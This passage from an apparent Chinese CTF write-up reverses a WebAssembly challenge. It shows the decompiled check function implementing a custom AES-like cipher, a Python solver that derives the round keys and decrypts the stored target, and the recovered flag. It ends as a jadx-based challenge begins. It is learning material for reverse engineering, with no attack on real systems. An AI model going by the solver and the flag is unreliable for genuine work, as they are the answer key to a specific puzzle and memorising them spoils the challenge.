state]</span><br><span class="line">        <span class="keyword">for</span> r <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>, <span class="number">0</span>, -<span class="number">1</span>):</span><br><span class="line">            state = [b ^ k <span class="keyword">for</span> b, k <span class="keyword">in</span> <span class="built_in">zip</span>(state, round_keys[r])]</span><br><span class="line">            state = inv_mix_columns(state)</span><br><span class="line">            state = inv_shift_rows(state)</span><br><span class="line">            state = [rsbox[b] <span class="keyword">for</span> b <span class="keyword">in</span> state]</span><br><span class="line">        state = [b ^ k <span class="keyword">for</span> b, k <span class="keyword">in</span> <span class="built_in">zip</span>(state, round_keys[<span class="number">0</span>])]</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">bytes</span>(state)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 6. 分两块解密并合并</span></span><br><span class="line">    block1 = decrypt_block(full_ciphertext[<span class="number">0</span>:<span class="number">16</span>])</span><br><span class="line">    block2 = decrypt_block(full_ciphertext[<span class="number">16</span>:<span class="number">32</span>])</span><br><span class="line">    </span><br><span class="line">    full_flag = block1 + block2</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 移除 PKCS#7 填充 (填充字节的值等于填充的长度)</span></span><br><span class="line">    padding_len = full_flag[-<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="number">0</span> &lt; padding_len &lt;= <span class="number">16</span>:</span><br><span class="line">        <span class="comment"># 简单检查是否真的是填充</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">all</span>(b == padding_len <span class="keyword">for</span> b <span class="keyword">in</span> full_flag[-padding_len:]):</span><br><span class="line">            full_flag = full_flag[:-padding_len]</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Flag:&quot;</span>, full_flag.decode(errors=<span class="string">&#x27;ignore&#x27;</span>))</span><br><span class="line"></span><br><span class="line">solve()</span><br></pre></td></tr></table></figure>
<p>还是干点人事吧</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wasm-decompile challenge.wasm -o challenge.dcmp</span><br></pre></td></tr></table></figure>
<p>这一步可以试着反编译为高级代码，可以直接notepad打开，勉强可读</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br></pre></td><td class="code"><pre><span class="line">export memory memory(initial: 258, max: 258);</span><br><span class="line"></span><br><span class="line">global g_a:int = 66880;</span><br><span class="line"></span><br><span class="line">export table indirect_function_table:funcref(min: 2, max: 2);</span><br><span class="line"></span><br><span class="line">data d_XK6T9Jc915jqlenkOyB_HSvA4asu(offset: 1024) =</span><br><span class="line">  &quot;\80\80XK\c6\16^\90\95\b56\aa^T\fe\9a\ab\cd\179^\82\f1Jc\b7,\90\d5\08\7f&quot;</span><br><span class="line">  &quot;\e69&amp;-!\a815\9fj[=q\a4\8d\f1,\90\d8\93&#x27;\a0\03\1d\aa\f7\8e\f8\f5\c6\fe(&quot;</span><br><span class="line">  &quot;\9a\ed\a7\c9|le\ad\96n\ff\bf\ab+\82kO^\9dy\99B\cc_\c0]H\da\b8\b1&#125;\e8/S&quot;</span><br><span class="line">  &quot;\d9v@A4\00\fa\08a\8c\e9s\b9u\de\09\8bZ\b7z\a6\eb\010\91\e4c\10\16\02\95&quot;</span><br><span class="line">  &quot;\8a\b5\f0\a1\19\17i\df\1f\a3X%\0af\c5\f2\0b\f9\1a\d5\c8\c7b\af\e6\ec\80&quot;</span><br><span class="line">  &quot;&#123;J\a5\a9\88\97VI\b6\05\cd\1eM\9e\fd$g&gt;\07C):\db\15\86xp\ca\d2\1c\b4\e2&quot;</span><br><span class="line">  &quot;N\84\04Q\81\bah`P\13\~\06\98\89\f68\cb\cf\be#\bd\92m7\d7\8f\14\f36\0c\ae&quot;</span><br><span class="line">  &quot;\b0? \f4R\e0&quot;\7ftF\fc\ee\9c\b2\87.E\11\e7\d1\d0*d\ef&lt;\12Y\acT;o\0d\e3\dc&quot;</span><br><span class="line">  &quot;\9bG\c4\bb\a2\c2K3\83\d4\ce\c1D\dd\b3\94\0fr\85\d6\fb\d3W\e5\bc\182\1b&quot;</span><br><span class="line">  &quot;\c3wU\ea\0e\e1L\96&lt;\d1s/\ac\fe\c2\00V\e1&amp;4\9a\e1/\b5O\a3\86\fb\87\f8\91&quot;</span><br><span class="line">  &quot;\0a\9b\00\fb\0f\8d$w&quot;;</span><br><span class="line"></span><br><span class="line">export function initialize() &#123;</span><br><span class="line">  nop</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">export function check(a:int, b:int):int &#123;</span><br><span class="line">  var d:int;</span><br><span class="line">  var f:int;</span><br><span class="line">  var c:int;</span><br><span class="line">  var h:int = g_a - 144;</span><br><span class="line">  g_a = h;</span><br><span class="line">  if (b &gt; 48) goto B_a;</span><br><span class="line">  var i:int = h + 128;</span><br><span class="line">  loop L_b &#123;</span><br><span class="line">    if (d != 8) &#123;</span><br><span class="line">      (d + i)[0]:byte =</span><br><span class="line">        f_c((d + 1024)[0]:ubyte, (d + 1040)[0]:ubyte, d &amp; 255);</span><br><span class="line">      d = d + 1;</span><br><span class="line">      continue L_b;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  d = 8;</span><br><span class="line">  loop L_d &#123;</span><br><span class="line">    if (d != 16) &#123;</span><br><span class="line">      (d + i)[0]:byte =</span><br><span class="line">        f_c((d + 1024)[0]:ubyte, (d + 1040)[0]:ubyte, d &amp; 255);</span><br><span class="line">      d = d + 1;</span><br><span class="line">      continue L_d;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  var j:int = h - -64;</span><br><span class="line">  var e:int = (b &amp; 48) + 16;</span><br><span class="line">  loop L_f &#123;</span><br><span class="line">    if (b == f) &#123;</span><br><span class="line">      d = select_if(e, b, b &lt; e);</span><br><span class="line">      a = e - b;</span><br><span class="line">      loop L_i &#123;</span><br><span class="line">        if (b == d) goto B_h;</span><br><span class="line">        (b + j)[0]:byte = a;</span><br><span class="line">        b = b + 1;</span><br><span class="line">        continue L_i;</span><br><span class="line">      &#125;</span><br><span class="line">      unreachable;</span><br><span class="line">      label B_h:</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      (f + j)[0]:byte = (a + f)[0]:ubyte;</span><br><span class="line">      f = f + 1;</span><br><span class="line">      continue L_f;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  if (e != 32) goto B_a;</span><br><span class="line">  b = 0;</span><br><span class="line">  loop L_j &#123;</span><br><span class="line">    if (b &lt; 32) &#123;</span><br><span class="line">      c = b + j;</span><br><span class="line">      var k:int = b + h;</span><br><span class="line">      a = 0;</span><br><span class="line">      var g:int = g_a - 192;</span><br><span class="line">      g_a = g;</span><br><span class="line">      loop L_l &#123;</span><br><span class="line">        if (a == 16) &#123;</span><br><span class="line">          a = 0;</span><br><span class="line">          loop L_n &#123;</span><br><span class="line">            if (a == 16) &#123;</span><br><span class="line">              var l:int = g - 16;</span><br><span class="line">              f = 1;</span><br><span class="line">              loop L_q &#123;</span><br><span class="line">                if (f == 11) goto B_p;</span><br><span class="line">                e = f * 17;</span><br><span class="line">                a = 0;</span><br><span class="line">                c = l + (d = f &lt;&lt; 4);</span><br><span class="line">                loop L_r &#123;</span><br><span class="line">                  if (a == 16) &#123;</span><br><span class="line">                    f = f + 1;</span><br><span class="line">                    continue L_q;</span><br><span class="line">                  &#125; else &#123;</span><br><span class="line">                    (d + g + a)[0]:byte = (e ^ (a + c)[0]:ubyte) ^ a;</span><br><span class="line">                    a = a + 1;</span><br><span class="line">                    continue L_r;</span><br><span class="line">                  &#125;</span><br><span class="line">                  unreachable;</span><br><span class="line">                &#125;</span><br><span class="line">                unreachable;</span><br><span class="line">              &#125;</span><br><span class="line">              unreachable;</span><br><span class="line">              label B_p:</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">              (a + g)[0]:byte = (a + i)[0]:ubyte;</span><br><span class="line">              a = a + 1;</span><br><span class="line">              continue L_n;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          f_d(g + 176, g);</span><br><span class="line">          a = 1;</span><br><span class="line">          loop L_t &#123;</span><br><span class="line">            if (a == 11) &#123;</span><br><span class="line">              a = 0;</span><br><span class="line">              loop L_w &#123;</span><br><span class="line">                if (a == 16) goto B_v;</span><br><span class="line">                (a + k)[0]:byte = (g + 176 + a)[0]:ubyte;</span><br><span class="line">                a = a + 1;</span><br><span class="line">                continue L_w;</span><br><span class="line">              &#125;</span><br><span class="line">              unreachable;</span><br><span class="line">              label B_v:</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">              c = g + 176;</span><br><span class="line">              e = 0;</span><br><span class="line">              loop L_x &#123;</span><br><span class="line">                if (e != 16) &#123;</span><br><span class="line">                  d = c + e;</span><br><span class="line">                  d[0]:byte = (d[0]:ubyte + 1056)[0]:ubyte;</span><br><span class="line">                  e = e + 1;</span><br><span class="line">                  continue L_x;</span><br><span class="line">                &#125;</span><br><span class="line">              &#125;</span><br><span class="line">              e = c[1]:ubyte;</span><br><span class="line">              c[1]:byte = c[5]:ubyte;</span><br><span class="line">              d = c[9]:ubyte;</span><br><span class="line">              c[9]:byte = c[13]:ubyte;</span><br><span class="line">              c[5]:byte = d;</span><br><span class="line">              c[13]:byte = e;</span><br><span class="line">              d = c[2]:ubyte;</span><br><span class="line">              c[2]:byte = c[10]:ubyte;</span><br><span class="line">              c[10]:byte = d;</span><br><span class="line">              d = c[6]:ubyte;</span><br><span class="line">              c[6]:byte = c[14]:ubyte;</span><br><span class="line">              c[14]:byte = d;</span><br><span class="line">              d = c[15]:ubyte;</span><br><span class="line">              c[15]:byte = c[11]:ubyte;</span><br><span class="line">              c[11]:byte = c[7]:ubyte;</span><br><span class="line">              c[7]:byte = c[3]:ubyte;</span><br><span class="line">              c[3]:byte = d;</span><br><span class="line">              if (a != 10) &#123;</span><br><span class="line">                f_e(c);</span><br><span class="line">                f_e(c + 4);</span><br><span class="line">                f_e(c + 8);</span><br><span class="line">                f_e(c + 12);</span><br><span class="line">              &#125;</span><br><span class="line">              f_d(c, g + (a &lt;&lt; 4));</span><br><span class="line">              a = a + 1;</span><br><span class="line">              continue L_t;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          g_a = g + 192;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">          (g + 176 + a)[0]:byte = (a + c)[0]:ubyte;</span><br><span class="line">          a = a + 1;</span><br><span class="line">          continue L_l;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      b = b + 16;</span><br><span class="line">      continue L_j;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  b = 0;</span><br><span class="line">  loop L_aa &#123;</span><br><span class="line">    a = b;</span><br><span class="line">    if (a != 32) &#123;</span><br><span class="line">      b = a + 1;</span><br><span class="line">      if ((a + h)[0]:ubyte == (a + 1312)[0]:ubyte) continue L_aa;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  c = a &gt; 31;</span><br><span class="line">  label B_a:</span><br><span class="line">  g_a = h + 144;</span><br><span class="line">  return c;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function f_c(a:int, b:int, c:int):int &#123;</span><br><span class="line">  return c * -23 + (a ^ b) &amp; 255</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function f_d(a:int, b:int) &#123;</span><br><span class="line">  var c:int;</span><br><span class="line">  loop L_a &#123;</span><br><span class="line">    if (c != 16) &#123;</span><br><span class="line">      var d:int = a + c;</span><br><span class="line">      d[0]:byte = d[0]:ubyte ^ (b + c)[0]:ubyte;</span><br><span class="line">      c = c + 1;</span><br><span class="line">      continue L_a;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function f_e(a:int) &#123;</span><br><span class="line">  var c:int;</span><br><span class="line">  var d:int;</span><br><span class="line">  var e:int;</span><br><span class="line">  var f:int;</span><br><span class="line">  var g:int;</span><br><span class="line">  var b:int;</span><br><span class="line">  var h:int;</span><br><span class="line">  a[0]:byte =</span><br><span class="line">    (f_f(e = (c = a[1]:ubyte) ^ (d = a[0]:ubyte)) ^ d) ^</span><br><span class="line">    (h = (g = (f = a[2]:ubyte) ^ e) ^ (b = a[3]:ubyte));</span><br><span class="line">  a[1]:byte = (f_f(c ^ f) ^ c) ^ h;</span><br><span class="line">  a[2]:byte = (f_f(b ^ f) ^ b) ^ e;</span><br><span class="line">  a[3]:byte = f_f(b ^ d) ^ g;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function f_f(a:int):int &#123;</span><br><span class="line">  return ((i32_extend8_s(a) &gt;&gt; 7 &amp; 27) ^ a &lt;&lt; 1) &amp; 255</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">export function emscripten_stack_restore(a:int) &#123;</span><br><span class="line">  g_a = a</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">export function emscripten_stack_get_current():int &#123;</span><br><span class="line">  return g_a</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/images/image-20251225230436279.png" alt=""></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">solve</span>():</span><br><span class="line">    <span class="comment"># 原始数据段 (从 1024 开始)</span></span><br><span class="line">    <span class="comment"># 根据伪代码，我们需要提取 key1, key2, sbox 和 target</span></span><br><span class="line">    raw_data = <span class="string">r&quot;\80\80XK\c6\16^\90\95\b56\aa^T\fe\9a\ab\cd\179^\82\f1Jc\b7,\90\d5\08\7f\e69&amp;-!\a815\9fj[=q\a4\8d\f1,\90\d8\93&#x27;\a0\03\1d\aa\f7\8e\f8\f5\c6\fe(\9a\ed\a7\c9|le\ad\96n\ff\bf\ab+\82kO^\9dy\99B\cc_\c0]H\da\b8\b1&#125;\e8/S\d9v@A4\00\fa\08a\8c\e9s\b9u\de\09\8bZ\b7z\a6\eb\010\91\e4c\10\16\02\95\8a\b5\f0\a1\19\17i\df\1f\a3X%\0af\c5\f2\0b\f9\1a\d5\c8\c7b\af\e6\ec\80&#123;J\a5\a9\88\97VI\b6\05\cd\1eM\9e\fd$g&gt;\07C):\db\15\86xp\ca\d2\1c\b4\e2N\84\04Q\81\bah`P\13\~\06\98\89\f68\cb\cf\be#\bd\92m7\d7\8f\14\f36\0c\ae\b0? \f4R\e0\22\7ftF\fc\ee\9c\b2\87.E\11\e7\d1\d0*d\ef&lt;\12Y\acT;o\0d\e3\dc\9bG\c4\bb\a2\c2K3\83\d4\ce\c1D\dd\b3\94\0fr\85\d6\fb\d3W\e5\bc\182\1b\c3wU\ea\0e\e1L\96&lt;\d1s/\ac\fe\c2\00V\e1&amp;4\9a\e1/\b5O\a3\86\fb\87\f8\91\0a\9b\00\fb\0f\8d$w&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">parse_wat</span>(<span class="params">s</span>):</span><br><span class="line">        res = <span class="built_in">bytearray</span>()</span><br><span class="line">        i = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> i &lt; <span class="built_in">len</span>(s):</span><br><span class="line">            <span class="keyword">if</span> s[i] == <span class="string">&#x27;\\&#x27;</span> <span class="keyword">and</span> i+<span class="number">2</span> &lt; <span class="built_in">len</span>(s) <span class="keyword">and</span> s[i+<span class="number">1</span>:i+<span class="number">3</span>].isalnum():</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    res.append(<span class="built_in">int</span>(s[i+<span class="number">1</span>:i+<span class="number">3</span>], <span class="number">16</span>))</span><br><span class="line">                    i += <span class="number">3</span></span><br><span class="line">                <span class="keyword">except</span>: res.append(<span class="built_in">ord</span>(s[i])); i += <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                res.append(<span class="built_in">ord</span>(s[i]))</span><br><span class="line">                i += <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">    blob = parse_wat(raw_data)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 1. 生成 Round Key 0 (f_c)</span></span><br><span class="line">    rk0 = <span class="built_in">bytearray</span>(<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        rk0[i] = (i * -<span class="number">23</span> + (blob[i] ^ blob[i+<span class="number">16</span>])) &amp; <span class="number">0xFF</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 2. 迭代生成 11 轮密钥</span></span><br><span class="line">    round_keys = [rk0]</span><br><span class="line">    <span class="keyword">for</span> r <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">11</span>):</span><br><span class="line">        prev = round_keys[-<span class="number">1</span>]</span><br><span class="line">        curr = <span class="built_in">bytearray</span>([(prev[i] ^ (r * <span class="number">17</span>) ^ i) &amp; <span class="number">0xFF</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>)])</span><br><span class="line">        round_keys.append(curr)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 3. 提取 S 盒和目标密文</span></span><br><span class="line">    sbox = blob[<span class="number">32</span>:<span class="number">288</span>]</span><br><span class="line">    rsbox = [<span class="number">0</span>]*<span class="number">256</span></span><br><span class="line">    <span class="keyword">for</span> i, v <span class="keyword">in</span> <span class="built_in">enumerate</span>(sbox): rsbox[v] = i</span><br><span class="line">    </span><br><span class="line">    target = blob[<span class="number">288</span>:<span class="number">320</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 4. AES 逆向组件</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">inv_shift_rows</span>(<span class="params">s</span>):</span><br><span class="line">        <span class="keyword">return</span> [s[<span class="number">0</span>], s[<span class="number">13</span>], s[<span class="number">10</span>], s[<span class="number">7</span>], s[<span class="number">4</span>], s[<span class="number">1</span>], s[<span class="number">14</span>], s[<span class="number">11</span>], s[<span class="number">8</span>], s[<span class="number">5</span>], s[<span class="number">2</span>], s[<span class="number">15</span>], s[<span class="number">12</span>], s[<span class="number">9</span>], s[<span class="number">6</span>], s[<span class="number">3</span>]]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">xtime</span>(<span class="params">x</span>):</span><br><span class="line">        <span class="keyword">return</span> ((x &lt;&lt; <span class="number">1</span>) ^ <span class="number">0x1B</span>) &amp; <span class="number">0xFF</span> <span class="keyword">if</span> (x &amp; <span class="number">0x80</span>) <span class="keyword">else</span> (x &lt;&lt; <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">mul</span>(<span class="params">x, y</span>):</span><br><span class="line">        res = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">            <span class="keyword">if</span> (y &gt;&gt; i) &amp; <span class="number">1</span>: res ^= x</span><br><span class="line">            x = xtime(x)</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">inv_mix_cols</span>(<span class="params">s</span>):</span><br><span class="line">        ns = [<span class="number">0</span>]*<span class="number">16</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">16</span>, <span class="number">4</span>):</span><br><span class="line">            c = s[i:i+<span class="number">4</span>]</span><br><span class="line">            ns[i+<span class="number">0</span>] = mul(c[<span class="number">0</span>], <span class="number">14</span>) ^ mul(c[<span class="number">1</span>], <span class="number">11</span>) ^ mul(c[<span class="number">2</span>], <span class="number">13</span>) ^ mul(c[<span class="number">3</span>], <span class="number">9</span>)</span><br><span class="line">            ns[i+<span class="number">1</span>] = mul(c[<span class="number">0</span>], <span class="number">9</span>)  ^ mul(c[<span class="number">1</span>], <span class="number">14</span>) ^ mul(c[<span class="number">2</span>], <span class="number">11</span>) ^ mul(c[<span class="number">3</span>], <span class="number">13</span>)</span><br><span class="line">            ns[i+<span class="number">2</span>] = mul(c[<span class="number">0</span>], <span class="number">13</span>) ^ mul(c[<span class="number">1</span>], <span class="number">9</span>)  ^ mul(c[<span class="number">2</span>], <span class="number">14</span>) ^ mul(c[<span class="number">3</span>], <span class="number">11</span>)</span><br><span class="line">            ns[i+<span class="number">3</span>] = mul(c[<span class="number">0</span>], <span class="number">11</span>) ^ mul(c[<span class="number">1</span>], <span class="number">13</span>) ^ mul(c[<span class="number">2</span>], <span class="number">9</span>)  ^ mul(c[<span class="number">3</span>], <span class="number">14</span>)</span><br><span class="line">        <span class="keyword">return</span> ns</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decrypt_block</span>(<span class="params">block</span>):</span><br><span class="line">        state = [(b ^ k) <span class="keyword">for</span> b, k <span class="keyword">in</span> <span class="built_in">zip</span>(block, round_keys[<span class="number">10</span>])]</span><br><span class="line">        state = inv_shift_rows(state)</span><br><span class="line">        state = [rsbox[b] <span class="keyword">for</span> b <span class="keyword">in</span> state]</span><br><span class="line">        <span class="keyword">for</span> r <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>, <span class="number">0</span>, -<span class="number">1</span>):</span><br><span class="line">            state = [(b ^ k) <span class="keyword">for</span> b, k <span class="keyword">in</span> <span class="built_in">zip</span>(state, round_keys[r])]</span><br><span class="line">            state = inv_mix_cols(state)</span><br><span class="line">            state = inv_shift_rows(state)</span><br><span class="line">            state = [rsbox[b] <span class="keyword">for</span> b <span class="keyword">in</span> state]</span><br><span class="line">        state = [(b ^ k) <span class="keyword">for</span> b, k <span class="keyword">in</span> <span class="built_in">zip</span>(state, round_keys[<span class="number">0</span>])]</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">bytes</span>(state)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 解密两个分组</span></span><br><span class="line">    res1 = decrypt_block(target[:<span class="number">16</span>])</span><br><span class="line">    res2 = decrypt_block(target[<span class="number">16</span>:])</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Result:&quot;</span>, (res1 + res2).decode(errors=<span class="string">&#x27;ignore&#x27;</span>))</span><br><span class="line"></span><br><span class="line">solve()</span><br></pre></td></tr></table></figure>
<p><strong>flag{One_Easy_Wasm_Chall}</strong></p>
<ul>
<li>JN</li>
</ul>
<blockquote>
<p>Why can’t some functions be seen</p>
</blockquote>
<p>jadx打开出现了报错信息：</p>
